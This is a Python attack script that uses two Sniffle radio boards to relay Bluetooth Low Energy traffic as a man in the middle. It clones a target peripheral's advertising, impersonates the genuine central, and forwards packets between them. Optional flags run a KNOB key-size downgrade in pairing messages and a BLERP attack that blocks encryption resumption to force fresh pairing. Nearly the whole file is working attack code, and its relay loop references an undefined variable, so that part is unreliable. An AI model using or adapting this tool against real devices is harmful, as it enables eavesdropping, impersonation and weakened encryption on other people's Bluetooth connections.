#!/usr/bin/env python3

"""Run both halves of the BLE relay from one Python process.

This script drives two Sniffle boards from a single process:

  * central_hw    -- impersonates the genuine central and connects to the
                     genuine target peripheral
  * peripheral_hw -- impersonates (clones the advertising of) the genuine
                     target peripheral and accepts the genuine central's
                     connection

Usage (run from the python_cli directory), e.g.:
    python3 relay-single.py --central-port /dev/ttyACM0 \
            --peripheral-port /dev/ttyACM1 -m AA:BB:CC:DD:EE:FF

"""

import argparse
import sys
from binascii import unhexlify
from queue import Empty, Full, Queue
from random import randint, randrange
from select import select
from struct import pack, unpack
from threading import Thread

from sniffle.constants import BLE_ADV_AA
from sniffle.crc_ble import rbit24
from sniffle.packet_decoder import (
    AdvDirectIndMessage,
    AdvIndMessage,
    AdvertMessage,
    ConnectIndMessage,
    DPacketMessage,
    LlControlMessage,
    PacketMessage,
    ScanRspMessage,
    str_mac,
)
from sniffle.pcap import PcapBleWriter
from sniffle.sniffle_hw import (
    DebugMessage,
    MeasurementMessage,
    SniffleHW,
    SnifferMode,
    SnifferState,
    StateMessage,
)


class AsyncPacketLogger:
    """Keep decoding, terminal output, and PCAP writes off the relay path."""

    def __init__(self, quiet=False, decode=True, output=None):
        self.quiet = quiet
        self.decode = decode
        self.pcap = PcapBleWriter(output) if output else None
        self.queue = Queue(maxsize=512)
        self.dropped = 0
        self.thread = Thread(target=self._run, name="relay-log", daemon=True)
        self.thread.start()

    def submit(self, side, packet):
        if not self.decode and self.pcap is None:
            return
        if len(packet.body) < 2:
            return
        if self.quiet and packet.body[1] == 0:
            return
        try:
            self.queue.put_nowait((side, packet))
        except Full:
            self.dropped += 1

    def _decode(self, packet):
        try:
            return DPacketMessage.decode(packet)
        except Exception:
            # Preserve malformed packets for PCAP output.
            return packet

    def _run(self):
        while True:
            item = self.queue.get()
            try:
                if item is None:
                    return
                side, packet = item

                decoded = self._decode(packet)

                if self.decode:
                    print("[%s] %s" % (side, decoded), end="\n\n")

                if self.pcap is not None:
                    self.pcap.write_packet_message(decoded)
            except Exception as exc:
                print("Packet logging failed on %s: %s" % (side, exc), file=sys.stderr)
            finally:
                self.queue.task_done()

    def write_setup_packet(self, packet):
        if self.pcap is not None:
            self.pcap.write_packet_message(packet)

    def close(self, drain=True, timeout=None):
        if drain:
            self.queue.join()
        else:
            while True:
                try:
                    item = self.queue.get_nowait()
                except Empty:
                    break
                if item is not None:
                    self.dropped += 1
                self.queue.task_done()
        self.queue.put(None)
        self.thread.join(timeout)
        if self.dropped:
            print("Dropped %d packets while logging" % self.dropped, file=sys.stderr)
        if self.pcap is not None:
            self.pcap.close()


def parse_preloads(plstr):
    preloads = []
    if plstr:
        # expect colon separated pairs, separated by commas
        for tstr in plstr.split(","):
            tsplit = tstr.split(":")
            tup = (int(tsplit[0]), int(tsplit[1]))
            preloads.append(tup)
    return preloads


def has_instant(pkt):
    return isinstance(pkt, LlControlMessage) and pkt.opcode in [0x00, 0x01, 0x18]


def is_param_req(pkt):
    return isinstance(pkt, LlControlMessage) and pkt.opcode == 0x0F


def decode_packet(packet):
    return (
        packet if isinstance(packet, DPacketMessage) else DPacketMessage.decode(packet)
    )


def decode_if_needed(packet, needed):
    return decode_packet(packet) if needed else None


def get_mac_from_irk(hw, irk, chan=37):
    hw.cmd_chan_aa_phy(chan, BLE_ADV_AA, 0)
    hw.cmd_pause_done(True)
    hw.cmd_follow(False)  # capture advertisements only
    hw.cmd_rssi(-128)
    hw.cmd_irk(irk, False)
    hw.cmd_auxadv(False)
    hw.mark_and_flush()

    print("Waiting for advertisement with suitable RPA...")
    while True:
        msg = hw.recv_and_decode()
        if not isinstance(msg, PacketMessage):
            continue
        decoded = decode_packet(msg)
        if isinstance(decoded, AdvIndMessage) or isinstance(
            decoded, AdvDirectIndMessage
        ):
            print("Found target MAC: %s" % str_mac(decoded.AdvA))
            return decoded.AdvA


def get_mac_from_string(hw, s, chan=37):
    hw.cmd_chan_aa_phy(chan, BLE_ADV_AA, 0)
    hw.cmd_pause_done(True)
    hw.cmd_follow(False)  # capture advertisements only
    hw.cmd_rssi(-128)
    hw.cmd_mac()
    hw.cmd_auxadv(False)
    hw.random_addr()
    hw.cmd_scan()
    hw.mark_and_flush()

    print("Waiting for advertisement containing specified string...")
    while True:
        msg = hw.recv_and_decode()
        if not isinstance(msg, PacketMessage):
            continue
        decoded = decode_packet(msg)
        if (
            isinstance(decoded, AdvIndMessage)
            or isinstance(decoded, AdvDirectIndMessage)
            or isinstance(decoded, ScanRspMessage)
        ):
            if s in decoded.body:
                print("Found target MAC: %s" % str_mac(decoded.AdvA))
                return decoded.AdvA, not decoded.TxAdd


def scan_target(hw, mac, chan=37):
    advert = None
    scan_rsp = None

    hw.cmd_chan_aa_phy(chan, BLE_ADV_AA, 0)
    hw.cmd_pause_done(True)
    hw.cmd_follow(False)
    hw.cmd_rssi(-128)
    hw.cmd_mac(mac, False)
    hw.cmd_auxadv(False)  # we only support impersonating legacy advertisers for now
    hw.random_addr()
    hw.cmd_scan()
    hw.mark_and_flush()

    print("Scanning target for advertisement and scan response...")
    while (advert is None) or (scan_rsp is None):
        msg = hw.recv_and_decode()
        if not isinstance(msg, PacketMessage):
            continue
        decoded = decode_packet(msg)
        if isinstance(decoded, AdvIndMessage):
            if advert is None:
                print("Found advertisement.")
            advert = decoded
        elif isinstance(decoded, ScanRspMessage):
            if scan_rsp is None:
                print("Found scan response.")
            scan_rsp = decoded
        elif isinstance(decoded, AdvertMessage):
            print("Received incompatible advertisement of type %s." % decoded.pdutype)
            return None, None

    print("Target Advertisement:")
    print(advert)
    print()
    print("Target Scan Response:")
    print(scan_rsp)
    print()

    return advert, scan_rsp


def select_target(central_hw, args):
    """Choose the target device for relaying."""
    if args.irk:
        return get_mac_from_irk(central_hw, unhexlify(args.irk), args.advchan), True
    if args.string:
        search = (
            args.string.encode("latin-1").decode("unicode_escape").encode("latin-1")
        )
        address, is_public = get_mac_from_string(central_hw, search, args.advchan)
        return address, not is_public
    try:
        address = bytes(int(part, 16) for part in reversed(args.mac.split(":")))
    except (AttributeError, ValueError):
        raise ValueError("MAC must be 6 colon-separated hex bytes")
    if len(address) != 6:
        raise ValueError("MAC must be 6 colon-separated hex bytes")
    return address, not args.public


def build_connect_ll_data(interval=24, latency=1):
    """Build the CONNECT_IND LL data.

    relay.py.old used pyble.controller.build_connect_ll_data for this, which
    is not part of the current tree. This builds the same kind of LL data that
    SniffleHW.initiate_conn() generates, but also returns the initial CRC
    value so the decoder state can be configured explicitly.
    """
    llData = []

    # access address
    llData.extend([randrange(0x100) for i in range(4)])

    # initial CRC
    llData.extend([randrange(0x100) for i in range(3)])

    # WinSize, WinOffset, Interval, Latency, Timeout
    llData.append(3)
    llData.extend(pack("<H", randint(5, 15)))
    llData.extend(pack("<H", interval))
    llData.extend(pack("<H", latency))
    llData.extend(pack("<H", 50))

    # Channel Map
    llData.extend([0xFF, 0xFF, 0xFF, 0xFF, 0x1F])

    # Hop, SCA = 0
    llData.append(randint(5, 16))

    llData = bytes(llData)
    access_address = unpack("<L", llData[:4])[0]
    return llData, access_address


# Current firmware requires an advertising interval above 20 ms
# (relay.py.old asked for 5 ms) and caps TX power at +5 dBm
# (relay.py.old asked for +8 dBm).
PERIPHERAL_ADV_INTERVAL_MS = 21


def configure_peripheral(peripheral_hw, advert, scan_rsp, preloads):
    """Set up the peripheral board to impersonate the target advertiser."""
    peripheral_hw.cmd_setaddr(advert.AdvA, bool(advert.TxAdd))
    peripheral_hw.cmd_adv_interval(PERIPHERAL_ADV_INTERVAL_MS)
    peripheral_hw.cmd_tx_power(5)
    peripheral_hw.cmd_follow(True)
    peripheral_hw.cmd_rssi(-128)
    peripheral_hw.cmd_interval_preload(preloads)
    peripheral_hw.cmd_phy_preload(None)
    peripheral_hw.mark_and_flush()
    peripheral_hw.cmd_advertise(advert.body[8:], scan_rsp.body[8:])


def wait_for_peripheral_connection(peripheral_hw):
    print("Advertising from relay peripheral; waiting for central...")
    while True:
        msg = peripheral_hw.recv_and_decode()
        if not isinstance(msg, PacketMessage):
            continue
        decoded = decode_packet(msg)
        if isinstance(decoded, ConnectIndMessage):
            print(decoded, end="\n\n")
            # ensure decoder state is ready for the connection
            # (recv_and_decode usually applied it already through
            # update_state; be explicit in case stale advertisement
            # packets were decoded meanwhile)
            peripheral_hw.decoder_state.cur_aa = decoded.aa_conn
            peripheral_hw.decoder_state.crc_init_rev = rbit24(decoded.CRCInit)
            return decoded


def connect_central_to_target(
    central_hw, target, target_random, conn_req, args, preloads
):

    interval = conn_req.Interval
    latency = conn_req.Latency

    central_hw.cmd_chan_aa_phy(args.advchan, BLE_ADV_AA, 0)
    central_hw.cmd_pause_done(True)
    central_hw.cmd_follow(False)
    central_hw.cmd_rssi(-128)
    central_hw.cmd_mac(target, False)
    central_hw.cmd_auxadv(False)
    central_hw.cmd_interval_preload(preloads)
    central_hw.cmd_phy_preload(None)
    central_hw.cmd_setaddr(conn_req.InitA, bool(conn_req.TxAdd))
    central_hw.mark_and_flush()

    ll_data, access_address = build_connect_ll_data(interval, latency)
    central_hw.cmd_connect(target, ll_data, target_random)
    central_hw.decoder_state.cur_aa = access_address
    central_hw.decoder_state.crc_init_rev = rbit24(
        int.from_bytes(ll_data[4:7], "little")
    )
    while True:
        msg = central_hw.recv_and_decode()
        if isinstance(msg, StateMessage):
            print("[relay-central] %s" % msg, end="\n\n")
            if msg.new_state == SnifferState.CENTRAL:
                # A stale advertising packet can arrive while the firmware
                # emits the state transition. Reassert the target link before
                # the relay loop starts decoding data packets.
                central_hw.decoder_state.cur_aa = access_address
                central_hw.decoder_state.crc_init_rev = rbit24(
                    int.from_bytes(ll_data[4:7], "little")
                )
                return


def stop_radios(central_hw, peripheral_hw):
    """Return both radios to a quiescent state.

    cmd_chan_aa_phy() resets the radio back to ad-sniffing mode
    and cmd_rssi(0) filters everything out.
    """
    for hw in (central_hw, peripheral_hw):
        if hw is None:
            continue
        try:
            hw.cmd_chan_aa_phy()
            hw.cmd_rssi(0)
        except Exception as exc:
            print("Unable to stop relay radio: %s" % exc, file=sys.stderr)


SMP_PAIRING_REQUEST = 0x01
SMP_PAIRING_RESPONSE = 0x02
L2CAP_CID_SMP = 0x0006

LL_ENC_REQ_OPCODE = 0x03
LL_REJECT_IND_OPCODE = 0x0D
LL_REJECT_REASON_PIN_OR_KEY_MISSING = 0x06
SMP_SECURITY_REQUEST_OPCODE = 0x0B
# L2CAP hdr (len=2, CID=SMP) + Security Request opcode + AuthReq.
# AuthReq 0x2D = Bonding | MITM protection | Secure Connections, matching the
# Security Request injected by RS_linux.py (relay.py.old used 0x01, bonding only).
BLERP_SECURITY_REQUEST_PDU = bytes(
    [0x02, 0x00, 0x06, 0x00, SMP_SECURITY_REQUEST_OPCODE, 0x2D]
)


def knob_downgrade(packet, key_size, label):
    """KNOB attack: rewrite the SMP max_key_size field in-flight.

    Pairing Request/Response PDUs are a single unfragmented L2CAP SDU
    (LLID 2) carrying the SMP opcode at payload offset 4 and max_key_size
    at offset 8. Lowering it (down to the BLE-legal minimum of 7) forces
    both sides to negotiate a shorter, more easily brute-forced session
    key, as long as neither side aborts on the encryption key size.
    """
    body = packet.body
    if len(body) < 2 or (body[0] & 0x03) != 2:
        return
    length = body[1]
    payload = body[2 : 2 + length]
    if len(payload) < 9:
        return
    if int.from_bytes(payload[2:4], "little") != L2CAP_CID_SMP:
        return
    opcode = payload[4]
    if opcode not in (SMP_PAIRING_REQUEST, SMP_PAIRING_RESPONSE):
        return
    if payload[8] <= key_size:
        return
    mutated = bytearray(body)
    mutated[2 + 8] = key_size
    packet.body = bytes(mutated)
    name = "Pairing Request" if opcode == SMP_PAIRING_REQUEST else "Pairing Response"
    print(
        "[KNOB] %s: downgraded %s max_key_size to %d" % (label, name, key_size),
        file=sys.stderr,
    )


def blerp_intercept_enc_req(decoded, peripheral_hw, blerp, label):
    """BLERP attack: block the first encryption procedure, forcing fresh pairing.

    Reject the LL_ENC_REQ with a PIN or Key Missing error and send an SMP
    Security Request, so the peripheral demands a fresh pairing exchange
    instead of resuming a session with a stored LTK. Only done once per
    connection, since blocking every LL_ENC_REQ would loop forever.
    """
    if not blerp.armed:
        return False
    if not isinstance(decoded, LlControlMessage) or decoded.opcode != LL_ENC_REQ_OPCODE:
        return False
    blerp.armed = False
    print(
        "[BLERP] %s: blocked LL_ENC_REQ, forcing fresh pairing" % label,
        file=sys.stderr,
    )
    peripheral_hw.cmd_transmit(
        3, bytes([LL_REJECT_IND_OPCODE, LL_REJECT_REASON_PIN_OR_KEY_MISSING])
    )
    peripheral_hw.cmd_transmit(2, BLERP_SECURITY_REQUEST_PDU)
    return True


class BlerpTrigger:
    """One-shot arming flag: fire the BLERP attack on the next LL_ENC_REQ only."""

    def __init__(self):
        self.armed = True


def forward_from_peripheral(
    packet, central_hw, peripheral_hw, filter_changes, knob_key_size, blerp
):
    """Genuine central -> relay peripheral -> relay central -> genuine peripheral."""
    if len(packet.body) < 2 or packet.body[1] == 0:
        return
    if knob_key_size is not None:
        knob_downgrade(packet, knob_key_size, "central->peripheral")
    decoded = decode_if_needed(
        packet, filter_changes or (blerp is not None and blerp.armed)
    )
    if blerp is not None and blerp_intercept_enc_req(
        decoded, peripheral_hw, blerp, "central->peripheral"
    ):
        return
    if filter_changes and has_instant(decoded):
        return
    central_hw.cmd_transmit(packet.body[0] & 3, packet.body[2:], packet.event)


def forward_from_central(
    packet, central_hw, peripheral_hw, filter_changes, knob_key_size
):
    """Genuine peripheral -> relay central -> relay peripheral -> genuine central."""
    if len(packet.body) < 2 or packet.body[1] == 0:
        return
    if knob_key_size is not None:
        knob_downgrade(packet, knob_key_size, "peripheral->central")
    decoded = decode_if_needed(packet, filter_changes)
    if filter_changes and is_param_req(decoded):
        # answer the genuine peripheral with LL_REJECT_EXT_IND
        # (rejecting opcode 0x0F with error 0x3B, unacceptable connection
        # parameters) instead of forwarding the parameter change, so the
        # relay keeps its own (possibly faster) connection parameters
        central_hw.cmd_transmit(3, b"\x11\x0f\x3b")
        return
    peripheral_hw.cmd_transmit(packet.body[0] & 3, packet.body[2:], packet.event)


def handle_message(
    side,
    msg,
    central_hw,
    peripheral_hw,
    packet_logger,
    filter_changes,
    knob_key_size,
    blerp,
):
    """Process one message from the given side of the relay.

    Returns True while the relay should keep running.
    """
    if isinstance(msg, StateMessage):
        print("[%s] %s" % (side, msg), end="\n\n")
        if msg.new_state == SnifferState.PAUSED:
            stop_radios(central_hw, peripheral_hw)
            return False
        return True
    if msg is None:
        return True
    if not isinstance(msg, PacketMessage):
        if isinstance(msg, (DebugMessage, MeasurementMessage)):
            print("[%s] %s" % (side, msg), end="\n\n")
        return True

    # Submit to the destination firmware before any optional decode/log work.
    if side == "central":
        forward_from_central(
            msg, central_hw, peripheral_hw, filter_changes, knob_key_size
        )
    else:
        forward_from_peripheral(
            msg, central_hw, peripheral_hw, filter_changes, knob_key_size, blerp
        )

    packet_logger.submit(side, msg)
    return True


def relay_loop(central_hw, peripheral_hw, packet_logger, knob_key_size, blerp):
    descriptors = {
        central_hw.ser.fd: ("central", central_hw),
        peripheral_hw.ser.fd: ("peripheral", peripheral_hw),
    }
    while True:
        ready, _, _ = select(list(descriptors), [], [])
        for fd in ready:
            side, hw = descriptors[fd]
            msg = hw.recv_and_decode()
            if not handle_message(
                side,
                msg,
                central_hw,
                peripheral_hw,
                packet_logger,
                filter_changes,
                knob_key_size,
                blerp,
            ):
                return


class Relay:
    """Own the two Sniffle links and the logger for one relay session."""

    def __init__(self, args):
        self.args = args
        self.central_hw = None
        self.peripheral_hw = None
        self.packet_logger = None
        self.shutdown_requested = False

    def run(self):
        args = self.args
        preloads = parse_preloads(args.preload)

        self.central_hw = SniffleHW(args.central_port)
        self.peripheral_hw = SniffleHW(args.peripheral_port)

        # put the hardware in a normal state (passive scanning) and configure
        # them with an impossibly high RSSI threshold so that they capture
        # nothing (to avoid filling receive buffers)
        self.central_hw.setup_sniffer(mode=SnifferMode.PASSIVE_SCAN, rssi_min=0)
        self.peripheral_hw.setup_sniffer(
            mode=SnifferMode.PASSIVE_SCAN, rssi_min=0, pause_done=True
        )

        target, target_random = select_target(self.central_hw, args)
        print(
            "Selected target %s (%s)"
            % (str_mac(target), "random" if target_random else "public"),
            end="\n\n",
        )

        advert, scan_rsp = scan_target(self.central_hw, target, args.advchan)
        if advert is None or scan_rsp is None:
            raise RuntimeError("target must use connectable ADV_IND advertising")

        # Do not leave the central actively scanning while waiting for the
        # genuine central to connect to the relay peripheral. A continuous
        # advertisement stream can fill the USB/RX queues and delay the
        # later initiation command.
        self.central_hw.setup_sniffer(mode=SnifferMode.PASSIVE_SCAN, rssi_min=0)

        configure_peripheral(self.peripheral_hw, advert, scan_rsp, preloads)
        conn_req = wait_for_peripheral_connection(self.peripheral_hw)
        print("Central connected to relay peripheral; connecting to target...")
        connect_central_to_target(
            self.central_hw, target, target_random, conn_req, args, preloads
        )
        print("Relay central connected to target.", end="\n\n")

        self.packet_logger = AsyncPacketLogger(
            quiet=args.quiet,
            decode=not args.no_decode,
            output=args.output,
        )
        self.packet_logger.write_setup_packet(advert)
        self.packet_logger.write_setup_packet(scan_rsp)
        self.packet_logger.write_setup_packet(conn_req)

        print("Relay running, press Ctrl+C to stop", end="\n\n")

        relay_loop(
            self.central_hw,
            self.peripheral_hw,
            self.packet_logger,
            args.knob,
            BlerpTrigger() if args.blerp else None,
        )

    def stop_radios(self):
        stop_radios(self.central_hw, self.peripheral_hw)

    def shutdown(self):
        self.shutdown_requested = True
        self.stop_radios()

    def close(self):
        try:
            if self.packet_logger is not None:
                self.packet_logger.close(
                    drain=not self.shutdown_requested,
                    timeout=0.5 if self.shutdown_requested else None,
                )
        finally:
            # SniffleHW has no close() in the current library, so close the
            # underlying serial port directly
            for hw in (self.central_hw, self.peripheral_hw):
                if hw is not None:
                    try:
                        hw.cancel_recv()
                        hw.ser.close()
                    except Exception as exc:
                        print("Unable to close relay port: %s" % exc, file=sys.stderr)


def build_arg_parser():
    parser = argparse.ArgumentParser(
        description="Run both Sniffle relay boards in one process"
    )
    parser.add_argument(
        "--central-port",
        required=True,
        help="Sniffle device connecting to the genuine peripheral",
    )
    parser.add_argument(
        "--peripheral-port",
        required=True,
        help="Sniffle device impersonating the genuine peripheral",
    )
    parser.add_argument("-c", "--advchan", default=37, choices=[37, 38, 39], type=int)
    parser.add_argument("-m", "--mac")
    parser.add_argument("-i", "--irk")
    parser.add_argument("-S", "--string")
    parser.add_argument("-P", "--public", action="store_true")
    parser.add_argument("-Q", "--preload")

    parser.add_argument("-q", "--quiet", action="store_true")
    parser.add_argument(
        "--no-decode",
        action="store_true",
        help="Disable LL terminal decoding on the relay hot path",
    )
    parser.add_argument("-o", "--output", help="PCAP output file")
    parser.add_argument(
        "-K",
        "--knob",
        nargs="?",
        type=int,
        const=7,
        default=None,
        metavar="KEY_SIZE",
        help="Perform the KNOB attack: rewrite the SMP max_key_size field "
        "in Pairing Request/Response PDUs down to KEY_SIZE bytes "
        "(default 7, the BLE-legal minimum)",
    )
    parser.add_argument(
        "-B",
        "--blerp",
        action="store_true",
        help="Perform the BLERP attack: block bonded reconnections that "
        "send LL_ENC_REQ without a preceding SMP pairing exchange, "
        "reject the encryption attempt, and send an SMP Security "
        "Request to force fresh pairing",
    )
    return parser


def validate_args(parser, args):
    targets = bool(args.mac) + bool(args.irk) + bool(args.string)
    if targets != 1:
        parser.error("specify exactly one of --mac, --irk, or --string")
    if args.public and not args.mac:
        parser.error("--public is only valid with --mac")
    if args.central_port == args.peripheral_port:
        parser.error("central and peripheral ports must be different")
    if args.knob is not None and not (7 <= args.knob <= 16):
        parser.error("--knob key size must be between 7 and 16")


def main():
    parser = build_arg_parser()
    args = parser.parse_args()
    validate_args(parser, args)
    relay = Relay(args)
    try:
        relay.run()
    except KeyboardInterrupt:
        print("\nStopping relay...", file=sys.stderr)
        relay.shutdown()
    except Exception:
        relay.shutdown()
        raise
    finally:
        relay.close()


if __name__ == "__main__":
    main()
